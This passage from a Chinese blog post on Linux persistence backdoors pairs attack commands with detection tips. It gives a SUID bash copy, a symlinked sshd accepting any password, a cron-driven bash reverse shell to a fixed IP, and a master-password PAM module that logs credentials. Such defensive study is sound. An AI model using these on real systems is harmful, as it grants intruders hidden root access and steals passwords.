除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01suid\"><a class=\"markdownIt-Anchor\" href=\"#0x01suid\">#</a> 0x01SUID</h4>\n<p>Suid shell 是一种可用于以拥有者权限运行的 shell。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配合普通用户权限使用</span><br><span class=\"line\">cp /bin/bash /tmp/shell</span><br><span class=\"line\">chmod u+s /tmp/shell</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp/shell</span><br><span class=\"line\">一般将其命名为find等系统命令，存在位置为/usr/bin</span><br></pre></td></tr></table></figure>\n<p>排查技巧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在Linux中查找SUID设置的文件</span><br><span class=\"line\">find . -perm /4000 </span><br><span class=\"line\"># 在Linux中查找使用SGID设置的文件</span><br><span class=\"line\">find . -perm /2000</span><br><span class=\"line\"># 取消s权限</span><br><span class=\"line\">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#0x02-ssh免密登录\">#</a> 0x02 ssh 免密登录</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa\t</span><br></pre></td></tr></table></figure>\n<p>再将公钥复制到.ssh 中 <code>/root/.ssh/authorized_keys</code></p>\n<h4 id=\"0x03-软连接\"><a class=\"markdownIt-Anchor\" href=\"#0x03-软连接\">#</a> 0x03 软连接</h4>\n<p>在 sshd 服务配置运行 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时只要 pam_rootok 模块检测 uid 为 0 即 root 权限即可成功认证登陆。通过软连接的方式，实质上 PAM 认证是通过软连接的文件名  <code>/tmp/su</code>  在 <code>/etc/pam.d/</code>  目录下寻找对应的 PAM 配置文件 (如: /etc/pam.d/su)，任意密码登陆的核心是 <code>auth sufficient pam_rootok.so</code> ，所以只要 PAM 配置文件中包含此配置即可 SSH 任意密码登陆，除了 su 中之外还有 chsh、chfn 同样可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>\n<p>执行完之后，任何一台机器 <code>ssh root@IP -p 8888</code> ，输入任意密码，成功登录。</p>\n<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>\n<h4 id=\"0x04crontab反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#0x04crontab反弹shell\">#</a> 0x04crontab 反弹 shell</h4>\n<p>crontab 命令用于设置周期性被执行的指令。新建 shell 脚本，利用脚本进行反弹。</p>\n<p>a、创建 shell 脚本，例如在 /etc/evil.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><code>chmod +sx /etc/evil.sh</code></p>\n<p>b、crontab -e 设置定时任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每一分钟执行一次</span><br><span class=\"line\">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>\n<p>重启 crond 服务， <code>service crond restart</code> ，然后就可以用 nc 接收 shell。</p>\n<h4 id=\"0x05pam后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05pam后门\">#</a> 0x05pam 后门</h4>\n<p>PAM （Pluggable Authentication Modules ）是由 Sun 提出的一种认证机制。它通过提供一些动态链接库和一套统一的 API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM 最初是集成在 Solaris 中，目前已移植到其它系统中，如 Linux、SunOS、HP-UX 9.0 等。</p>\n<p>利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class=\"line\">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class=\"line\">3、编译安装PAM</span><br><span class=\"line\">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1、通过Strace跟踪ssh</span><br><span class=\"line\">ps axu | grep sshd</span><br><span class=\"line\">strace -o aa -ff -p PID</span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"># 2、检查pam_unix.so的修改时间</span><br><span class=\"line\">stat /lib/security/pam_unix.so      #32位</span><br><span class=\"line\">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        }
    ]
}